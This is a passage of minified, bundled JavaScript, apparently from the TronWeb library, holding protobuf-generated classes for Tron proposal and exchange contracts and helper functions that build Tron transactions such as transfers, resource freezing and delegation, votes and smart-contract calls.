                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = i.getParametersMap();
                    n.readMessage(a, function(l, f) {
                        e.Map.deserializeBinary(l, f, e.BinaryReader.prototype.readInt64, e.BinaryReader.prototype.readInt64, null, 0, 0)
                    });
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ProposalCreateContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ProposalCreateContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getParametersMap(!0),
            s && s.getLength() > 0 && s.serializeBinary(2, n, e.BinaryWriter.prototype.writeInt64, e.BinaryWriter.prototype.writeInt64)
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.getParametersMap = function(i) {
            return e.Message.getMapField(this, 2, i, null)
        }
        ,
        TronWebProto.ProposalCreateContract.prototype.clearParametersMap = function() {
            return this.getParametersMap().clear(),
            this
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ProposalDeleteContract.prototype.toObject = function(i) {
            return TronWebProto.ProposalDeleteContract.toObject(i, this)
        }
        ,
        TronWebProto.ProposalDeleteContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                proposalId: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ProposalDeleteContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ProposalDeleteContract;
            return TronWebProto.ProposalDeleteContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ProposalDeleteContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setProposalId(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ProposalDeleteContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ProposalDeleteContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getProposalId(),
            s !== 0 && n.writeInt64(2, s)
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.getProposalId = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.ProposalDeleteContract.prototype.setProposalId = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        t.object.extend(r, TronWebProto)
    }(QT)),
    QT
}
Rge();
var eE = {}, vW;
function Wge() {
    return vW || (vW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("TronWebProto.ExchangeCreateContract", null, o),
        t.exportSymbol("TronWebProto.ExchangeInjectContract", null, o),
        t.exportSymbol("TronWebProto.ExchangeTransactionContract", null, o),
        t.exportSymbol("TronWebProto.ExchangeWithdrawContract", null, o),
        TronWebProto.ExchangeCreateContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ExchangeCreateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ExchangeCreateContract.displayName = "TronWebProto.ExchangeCreateContract"),
        TronWebProto.ExchangeInjectContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ExchangeInjectContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ExchangeInjectContract.displayName = "TronWebProto.ExchangeInjectContract"),
        TronWebProto.ExchangeWithdrawContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ExchangeWithdrawContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ExchangeWithdrawContract.displayName = "TronWebProto.ExchangeWithdrawContract"),
        TronWebProto.ExchangeTransactionContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ExchangeTransactionContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ExchangeTransactionContract.displayName = "TronWebProto.ExchangeTransactionContract"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeCreateContract.prototype.toObject = function(i) {
            return TronWebProto.ExchangeCreateContract.toObject(i, this)
        }
        ,
        TronWebProto.ExchangeCreateContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                firstTokenId: n.getFirstTokenId_asB64(),
                firstTokenBalance: e.Message.getFieldWithDefault(n, 3, 0),
                secondTokenId: n.getSecondTokenId_asB64(),
                secondTokenBalance: e.Message.getFieldWithDefault(n, 5, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ExchangeCreateContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ExchangeCreateContract;
            return TronWebProto.ExchangeCreateContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ExchangeCreateContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setFirstTokenId(a);
                    break;
                case 3:
                    var a = n.readInt64();
                    i.setFirstTokenBalance(a);
                    break;
                case 4:
                    var a = n.readBytes();
                    i.setSecondTokenId(a);
                    break;
                case 5:
                    var a = n.readInt64();
                    i.setSecondTokenBalance(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ExchangeCreateContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ExchangeCreateContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getFirstTokenId_asU8(),
            s.length > 0 && n.writeBytes(2, s),
            s = i.getFirstTokenBalance(),
            s !== 0 && n.writeInt64(3, s),
            s = i.getSecondTokenId_asU8(),
            s.length > 0 && n.writeBytes(4, s),
            s = i.getSecondTokenBalance(),
            s !== 0 && n.writeInt64(5, s)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getFirstTokenId = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getFirstTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getFirstTokenId())
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getFirstTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getFirstTokenId())
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.setFirstTokenId = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getFirstTokenBalance = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.setFirstTokenBalance = function(i) {
            return e.Message.setProto3IntField(this, 3, i)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getSecondTokenId = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getSecondTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getSecondTokenId())
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getSecondTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getSecondTokenId())
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.setSecondTokenId = function(i) {
            return e.Message.setProto3BytesField(this, 4, i)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.getSecondTokenBalance = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.ExchangeCreateContract.prototype.setSecondTokenBalance = function(i) {
            return e.Message.setProto3IntField(this, 5, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeInjectContract.prototype.toObject = function(i) {
            return TronWebProto.ExchangeInjectContract.toObject(i, this)
        }
        ,
        TronWebProto.ExchangeInjectContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                exchangeId: e.Message.getFieldWithDefault(n, 2, 0),
                tokenId: n.getTokenId_asB64(),
                quant: e.Message.getFieldWithDefault(n, 4, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ExchangeInjectContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ExchangeInjectContract;
            return TronWebProto.ExchangeInjectContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ExchangeInjectContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setExchangeId(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setTokenId(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setQuant(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ExchangeInjectContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ExchangeInjectContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getExchangeId(),
            s !== 0 && n.writeInt64(2, s),
            s = i.getTokenId_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getQuant(),
            s !== 0 && n.writeInt64(4, s)
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getExchangeId = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.setExchangeId = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getTokenId = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getTokenId())
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getTokenId())
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.setTokenId = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.getQuant = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.ExchangeInjectContract.prototype.setQuant = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeWithdrawContract.prototype.toObject = function(i) {
            return TronWebProto.ExchangeWithdrawContract.toObject(i, this)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                exchangeId: e.Message.getFieldWithDefault(n, 2, 0),
                tokenId: n.getTokenId_asB64(),
                quant: e.Message.getFieldWithDefault(n, 4, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ExchangeWithdrawContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ExchangeWithdrawContract;
            return TronWebProto.ExchangeWithdrawContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setExchangeId(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setTokenId(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setQuant(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ExchangeWithdrawContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ExchangeWithdrawContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getExchangeId(),
            s !== 0 && n.writeInt64(2, s),
            s = i.getTokenId_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getQuant(),
            s !== 0 && n.writeInt64(4, s)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getExchangeId = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.setExchangeId = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getTokenId = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getTokenId())
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getTokenId())
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.setTokenId = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.getQuant = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.ExchangeWithdrawContract.prototype.setQuant = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ExchangeTransactionContract.prototype.toObject = function(i) {
            return TronWebProto.ExchangeTransactionContract.toObject(i, this)
        }
        ,
        TronWebProto.ExchangeTransactionContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                exchangeId: e.Message.getFieldWithDefault(n, 2, 0),
                tokenId: n.getTokenId_asB64(),
                quant: e.Message.getFieldWithDefault(n, 4, 0),
                expected: e.Message.getFieldWithDefault(n, 5, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ExchangeTransactionContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ExchangeTransactionContract;
            return TronWebProto.ExchangeTransactionContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ExchangeTransactionContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setExchangeId(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setTokenId(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setQuant(a);
                    break;
                case 5:
                    var a = n.readInt64();
                    i.setExpected(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ExchangeTransactionContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ExchangeTransactionContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getExchangeId(),
            s !== 0 && n.writeInt64(2, s),
            s = i.getTokenId_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getQuant(),
            s !== 0 && n.writeInt64(4, s),
            s = i.getExpected(),
            s !== 0 && n.writeInt64(5, s)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getExchangeId = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.setExchangeId = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getTokenId = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getTokenId_asB64 = function() {
            return e.Message.bytesAsB64(this.getTokenId())
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getTokenId_asU8 = function() {
            return e.Message.bytesAsU8(this.getTokenId())
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.setTokenId = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getQuant = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.setQuant = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.getExpected = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.ExchangeTransactionContract.prototype.setExpected = function(i) {
            return e.Message.setProto3IntField(this, 5, i)
        }
        ,
        t.object.extend(r, TronWebProto)
    }(eE)),
    eE
}
Wge();
const {Transaction: rr, Permission: Mge, Key: Nge} = globalThis.TronWebProto
  , {TransferContract: Dge, FreezeBalanceContract: Fge, UnfreezeBalanceContract: Uge, WithdrawBalanceContract: kge, FreezeBalanceV2Contract: PU, UnfreezeBalanceV2Contract: CU, CancelAllUnfreezeV2Contract: SU, WithdrawExpireUnfreezeContract: BU, DelegateResourceContract: _U, UnDelegateResourceContract: IU} = globalThis.TronWebProto
  , {TransferAssetContract: Lge, ParticipateAssetIssueContract: $ge, AssetIssueContract: TW, UpdateAssetContract: zge} = globalThis.TronWebProto
  , {TriggerSmartContract: OU, ClearABIContract: jge, UpdateEnergyLimitContract: qge, UpdateSettingContract: Vge, CreateSmartContract: Hge, SmartContract: Uf} = globalThis.TronWebProto
  , {ResourceCode: sh} = globalThis.TronWebProto
  , {WitnessCreateContract: Gge, VoteWitnessContract: EW} = globalThis.TronWebProto
  , {UpdateBrokerageContract: Kge} = globalThis.TronWebProto
  , {AccountCreateContract: Zge, AccountUpdateContract: Yge, SetAccountIdContract: Xge, AccountPermissionUpdateContract: Jge} = globalThis.TronWebProto
  , {ProposalCreateContract: Qge, ProposalDeleteContract: eye, ProposalApproveContract: tye} = globalThis.TronWebProto
  , {ExchangeCreateContract: rye, ExchangeInjectContract: nye, ExchangeWithdrawContract: oye, ExchangeTransactionContract: iye} = globalThis.TronWebProto
  , Rt = r => !r || r.length === 0 ? new Uint8Array([]) : new Uint8Array(or.address.toHex(r).match(/.{1,2}/g).map(e => parseInt(e, 16)))
  , nn = r => !r || r.length === 0 ? new Uint8Array([]) : new Uint8Array((Ou(r) ? r : or.toHex(r)).replace(/^0x/, "").match(/.{1,2}/g).map(e => parseInt(e, 16)))
  , mu = (r, e) => nn(e ? or.fromUtf8(r).replace(/^0x/, "") : r.replace(/^0x/, ""))
  , sye = (r, e=!0) => (e ? "0x" : "") + ir(Buffer.from(r, "utf-8")).toString().substring(2)
  , dr = (r, e, t, o) => {
    const i = new Pge.Any;
    i.pack(r.serializeBinary(), "protocol." + t);
    const n = new rr.Contract;
    n.setType(e),
    n.setParameter(i),
    o && n.setPermissionId(o);
    const s = new rr.raw;
    s.addContract(n);
    const a = new rr;
    return a.setRawData(s),
    a
}
  , aye = (r, e) => {
    const {to_address: t, owner_address: o, amount: i} = r
      , n = new Dge;
    return n.setToAddress(Rt(t)),
    n.setOwnerAddress(Rt(o)),
    n.setAmount(i),
    dr(n, rr.Contract.ContractType.TRANSFERCONTRACT, "TransferContract", e.Permission_id)
}
  , cye = (r, e) => {
    const {to_address: t, owner_address: o, amount: i, asset_name: n} = r
      , s = new Lge;
    return s.setToAddress(Rt(t)),
    s.setOwnerAddress(Rt(o)),
    s.setAssetName(mu(n, e.visible)),
    s.setAmount(i),
    dr(s, rr.Contract.ContractType.TRANSFERASSETCONTRACT, "TransferAssetContract", e.Permission_id)
}
  , lye = (r, e) => {
    const t = new $ge;
    return t.setToAddress(Rt(r.to_address)),
    t.setOwnerAddress(Rt(r.owner_address)),
    t.setAssetName(mu(r.asset_name, e.visible)),
    t.setAmount(r.amount),
    dr(t, rr.Contract.ContractType.PARTICIPATEASSETISSUECONTRACT, "ParticipateAssetIssueContract", e.Permission_id)
}
  , uye = (r, e) => {
    const t = new OU
      , {owner_address: o, contract_address: i, parameter: n="", function_selector: s, call_value: a, call_token_value: l, token_id: f, data: h} = r;
    if (t.setOwnerAddress(Rt(o)),
    t.setContractAddress(Rt(i)),
    t.setCallValue(a),
    h)
        t.setData(nn(h));
    else if (s) {
        const p = sye(s).substring(2, 10) + n;
        t.setData(nn(p))
    }
    return f && t.setTokenId(f),
    l && t.setCallTokenValue(l),
    dr(t, rr.Contract.ContractType.TRIGGERSMARTCONTRACT, "TriggerSmartContract", e.Permission_id)
}
  , fye = (r, e) => {
    const t = new Fge
      , {owner_address: o, frozen_balance: i, frozen_duration: n, resource: s, receiver_address: a} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setFrozenBalance(i),
    t.setFrozenDuration(n),
    s && t.setResource(sh[s]),
    a && t.setReceiverAddress(Rt(a)),
    dr(t, rr.Contract.ContractType.FREEZEBALANCECONTRACT, "FreezeBalanceContract", e.Permission_id)
}
  , dye = (r, e) => {
    const t = new Uge
      , {owner_address: o, resource: i, receiver_address: n} = r;
    return t.setOwnerAddress(Rt(o)),
    i && t.setResource(sh[i]),
    n && t.setReceiverAddress(Rt(n)),
    dr(t, rr.Contract.ContractType.UNFREEZEBALANCECONTRACT, "UnfreezeBalanceContract", e.Permission_id)
}
  , hye = (r, e) => {
    const t = new kge
      , {owner_address: o} = r;
    return t.setOwnerAddress(Rt(o)),
    dr(t, rr.Contract.ContractType.WITHDRAWBALANCECONTRACT, "WithdrawBalanceContract", e.Permission_id)
}
  , pye = (r, e) => {
    const t = new PU
      , {owner_address: o, frozen_balance: i, resource: n} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setFrozenBalance(i),
    t.setResource(sh[n]),
    dr(t, rr.Contract.ContractType.FREEZEBALANCEV2CONTRACT, "FreezeBalanceV2Contract", e.Permission_id)
}
  , gye = (r, e) => {
    const t = new SU
      , {owner_address: o} = r;
    return t.setOwnerAddress(Rt(o)),
    dr(t, rr.Contract.ContractType.CANCELALLUNFREEZEV2CONTRACT, "CancelAllUnfreezeV2Contract", e.Permission_id)
}
  , yye = (r, e) => {
    const t = new CU
      , {owner_address: o, unfreeze_balance: i, resource: n} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setUnfreezeBalance(i),
    t.setResource(sh[n]),
    dr(t, rr.Contract.ContractType.UNFREEZEBALANCEV2CONTRACT, "UnfreezeBalanceV2Contract", e.Permission_id)
}
  , bye = (r, e) => {
    const t = new _U
      , {owner_address: o, receiver_address: i, balance: n, resource: s, lock: a=!1, lock_period: l} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setBalance(n),
    t.setResource(sh[s]),
    t.setLock(a),
    t.setLockPeriod(l),
    t.setReceiverAddress(Rt(i)),
    dr(t, rr.Contract.ContractType.DELEGATERESOURCECONTRACT, "DelegateResourceContract", e.Permission_id)
}
  , mye = (r, e) => {
    const t = new IU
      , {owner_address: o, receiver_address: i, balance: n, resource: s} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setBalance(n),
    t.setResource(sh[s]),
    t.setReceiverAddress(Rt(i)),
    dr(t, rr.Contract.ContractType.UNDELEGATERESOURCECONTRACT, "UnDelegateResourceContract", e.Permission_id)
}
  , xye = (r, e) => {
    const t = new BU
      , {owner_address: o} = r;
    return t.setOwnerAddress(Rt(o)),
    dr(t, rr.Contract.ContractType.WITHDRAWEXPIREUNFREEZECONTRACT, "WithdrawExpireUnfreezeContract", e.Permission_id)
}
  , wye = (r, e) => {
    const t = new Gge
      , {owner_address: o, url: i} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setUrl(nn(i.replace(/^0x/, ""))),
    dr(t, rr.Contract.ContractType.WITNESSCREATECONTRACT, "WitnessCreateContract", e.Permission_id)
}
  , vye = (r, e) => {
    const t = new EW
      , {owner_address: o, votes: i} = r;
    return t.setOwnerAddress(Rt(o)),
    i.forEach(n => {
        const s = new EW.Vote
          , {vote_address: a, vote_count: l} = n;
        s.setVoteAddress(Rt(a));
        const f = parseInt(l);
        s.setVoteCount(f),
        t.addVotes(s)
    }
    ),
    dr(t, rr.Contract.ContractType.VOTEWITNESSCONTRACT, "VoteWitnessContract", e.Permission_id)
}
  , Tye = (r, e) => {
    const t = r != null && r.new_contract ? {
        owner_address: r.owner_address,
        call_token_value: r.call_token_value,
        token_id: r.token_id,
        ...r.new_contract
    } : r
      , {owner_address: o, consume_user_resource_percent: i, origin_energy_limit: n, abi: s, bytecode: a="", parameter: l="", call_value: f, call_token_value: h, token_id: p, name: b} = t;
    let {origin_address: v} = t;
    const T = new Hge;
    T.setOwnerAddress(Rt(o)),
    p && T.setTokenId(p),
    h && T.setCallTokenValue(h);
    const x = new Uf;
    if (s) {
        let E;
        typeof s == "string" ? E = JSON.parse(s) : E = (s == null ? void 0 : s.entrys) || [];
        const B = new Uf.ABI
          , P = F => {
